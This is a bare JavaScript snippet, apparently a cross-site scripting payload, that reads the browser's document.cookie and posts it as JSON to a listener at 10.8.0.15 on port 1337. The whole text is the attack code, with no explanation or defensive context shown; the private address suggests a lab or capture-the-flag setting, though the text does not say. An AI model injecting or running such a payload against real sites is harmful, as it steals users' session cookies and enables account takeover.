fetch("http://10.8.0.15:1337", {
    headers: {
        "Content-Type": "application/json",
    },
    method: "POST",
    mode: 'cors',
    body: JSON.stringify({
        cookie: document.cookie,
    }),
});
